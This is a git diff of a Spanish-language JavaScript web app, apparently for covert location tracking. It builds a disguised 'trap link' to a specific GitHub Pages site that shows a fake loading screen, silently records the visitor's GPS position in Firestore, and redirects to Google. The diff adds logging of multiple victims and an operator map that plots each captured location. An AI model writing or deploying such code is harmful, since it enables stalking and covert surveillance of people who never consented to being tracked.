@@ -1,5 +1,6 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+import { getFirestore, collection, addCollection, addDoc, getDocs, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+// Nota: Usamos addDoc para generar registros múltiples independientes
 
 // CONFIGURA AQUÍ TUS CREDENCIALES DE FIREBASE
 const firebaseConfig = {
@@ -16,11 +17,10 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
 let map;
-let marker;
-let unsubscribeSnapshot = null; // Para controlar la conexión en tiempo real
+let marcadoresAracnidos = []; // Arreglo para almacenar múltiples arañas en el mapa
 const ubicacionPorDefecto = [14.3333, -90.6667]; 
 
-// Detectar si la URL trae un parámetro de objetivo (ej: ?target=objetivo_1)
+// Detectar si la URL trae un parámetro de objetivo
 const urlParams = new URLSearchParams(window.location.search);
 const targetId = urlParams.get('target');
 
@@ -32,12 +32,20 @@ const iconoArana = L.divIcon({
     iconAnchor: [15, 15]
 });
 
+// Icono alternativo para tu punto de origen/consola (opcional, un punto azul o clásico)
+const iconoOrigen = L.divIcon({
+    className: 'custom-origin-icon',
+    html: '<div style="font-size: 24px; text-align: center;">📍</div>',
+    iconSize: [25, 25],
+    iconAnchor: [12, 12]
+});
+
 document.addEventListener("DOMContentLoaded", function () {
     // ESCENARIO A: Si alguien abrió el enlace trampa en su celular
     if (targetId) {
         document.body.style.backgroundColor = "#ffffff";
         document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;color:#666;'><h3>Cargando recurso...</h3></div>";
-        iniciarCapturaDiscreta(targetId);
+        iniciarCapturaDiscreta();
         return; 
     }
 
@@ -49,28 +57,22 @@ document.addEventListener("DOMContentLoaded", function () {
         attribution: '&copy; OpenStreetMap contributors'
     }).addTo(map);
 
-    // Colocar el marcador de araña inicial
-    marker = L.marker(ubicacionPorDefecto, { icon: iconoArana }).addTo(map)
-        .bindPopup("<b>Sistema en línea.</b> Esperando señal...")
-        .openPopup();
-
     setTimeout(() => { map.invalidateSize(); }, 200);
 });
 
-// Botón SHARE LINK: Genera un enlace personalizado disfrazado
+// Botón SHARE LINK: Genera el enlace que pediste
 window.compartirEnlace = function() {
-    const baseUrl = window.location.origin + window.location.pathname;
-    const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
+    const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=objetivo_principal";
     
     navigator.clipboard.writeText(enlaceObjetivo).then(() => {
-        alert("¡Enlace copiado con éxito!\nPuedes enviarlo mediante chat.");
+        alert("¡Enlace táctico copiado al portapapeles!\n" + enlaceObjetivo);
     }).catch(err => {
         console.error("Error al copiar enlace:", err);
     });
 };
 
-// Capturar ubicación discretamente al abrir el enlace y salir
-function iniciarCapturaDiscreta(id) {
+// Capturar ubicación discretamente y guardarla como un nuevo registro único
+function iniciarCapturaDiscreta() {
     if (!navigator.geolocation) {
         window.location.href = "https://www.google.com";
         return;
@@ -82,13 +84,16 @@ function iniciarCapturaDiscreta(id) {
             const lng = position.coords.longitude;
 
             try {
-                await setDoc(doc(db, "ratreos", id), {
+                // Guardamos en una colección llamada "rastreos_multiples" usando addDoc 
+                // para que cada clic cree un documento nuevo con ID diferente y no se sobrescriba.
+                await addDoc(collection(db, "rastreos_multiples"), {
                     lat: lat,
                     lng: lng,
+                    tipo: "objetivo",
                     timestamp: new Date()
                 });
             } catch (e) {
-                console.error("Error al guardar:", e);
+                console.error("Error al guardar en base de datos:", e);
             }
             
             window.location.href = "https://www.google.com";
@@ -100,37 +105,52 @@ function iniciarCapturaDiscreta(id) {
     );
 }
 
-// Botón SYS.CHECK: Activa el enlace en tiempo real con la base de datos del objetivo
+// Botón SYS.CHECK: Carga tu posición de origen y todas las arañas de los objetivos guardados
 window.accionRastrearObjetivo = function() {
-    document.getElementById('banner-status').innerHTML = "BUSCANDO SEÑAL<br>CONECTANDO...";
-    
-    // Si ya había una escucha activa, la reiniciamos
-    if (unsubscribeSnapshot) {
-        unsubscribeSnapshot();
+    document.getElementById('banner-status').innerHTML = "CARGANDO HISTORIAL<br>DE ACCESOS...";
+
+    // 1. Obtener primero tu ubicación actual (Punto de origen)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const miLat = pos.coords.latitude;
+            const miLng = pos.coords.longitude;
+            
+            // Centrar mapa en tu posición de origen
+            map.setView([miLat, miLng], 14);
+            
+            // Colocar tu marcador de origen
+            const markerOrigen = L.marker([miLat, miLng], { icon: iconoOrigen }).addTo(map);
+            markerOrigen.bindPopup("<b>Tu posición (Origen)</b>").openPopup();
+        });
     }
 
-    // Escuchamos el documento "objetivo_principal" en tiempo real
-    unsubscribeSnapshot = onSnapshot(doc(db, "ratreos", "objetivo_principal"), (docSnap) => {
-        if (docSnap.exists()) {
+    // 2. Escuchar y pintar en tiempo real TODOS los puntos de acceso de las arañas guardadas
+    const q = query(collection(db, "rastreos_multiples"));
+    
+    onSnapshot(q, (snapshot) => {
+        // Limpiamos marcadores anteriores para evitar duplicados visuales al refrescar
+        marcadoresAracnidos.forEach(m => map.removeLayer(m));
+        marcadoresAracnidos = [];
+
+        if (snapshot.empty) {
+            document.getElementById('banner-status').innerHTML = "SIN REGISTROS<br>ESPERANDO CLICS...";
+            return;
+        }
+
+        snapshot.forEach((docSnap) => {
             const data = docSnap.data();
             const lat = data.lat;
             const lng = data.lng;
+            const fecha = data.timestamp ? new Date(data.timestamp.seconds * 1000).toLocaleTimeString() : "Reciente";
 
-            map.invalidateSize();
-            map.setView([lat, lng], 17);
+            // Crear un marcador de araña 🕷️ por cada registro encontrado en la base de datos
+            const spiderMarker = L.marker([lat, lng], { icon: iconoArana }).addTo(map);
+            spiderMarker.bindPopup(`<b>¡Acceso Registrado!</b><br>Hora: ${fecha}<br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`);
             
-            // Actualiza la posición con el icono de la araña 🕷️
-            marker.setLatLng([lat, lng]);
-            marker.bindPopup(`<b>¡Objetivo Atrapado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
-            
-            document.getElementById('banner-status').innerHTML = "SEÑAL CAPTURADA<br>ARAÑA POSICIONADA";
-        } else {
-            alert("Aún no hay registros de ubicación de este enlace.");
-            document.getElementById('banner-status').innerHTML = "SIN REGISTROS<br>ESPERANDO CLIC...";
-        }
-    }, (error) => {
-        console.error("Error al escuchar objetivo:", error);
-        alert("Error de conexión con la base de datos.");
+            marcadoresAracnidos.push(spiderMarker);
+        });
+
+        document.getElementById('banner-status').innerHTML = `REGISTROS ACTIVOS<br>ARAÑAS EN MAPA: ${snapshot.size}`;
     });
 };
 
@@ -141,7 +161,7 @@ window.obtenerUbicacionActual = function(esInicio = false) {
             const lat = pos.coords.latitude;
             const lng = pos.coords.longitude;
             map.setView([lat, lng], 16);
-            marker.setLatLng([lat, lng]).bindPopup("Tu posición local").openPopup();
+            L.marker([lat, lng]).addTo(map).bindPopup("Tu posición local").openPopup();
         });
     }
 };
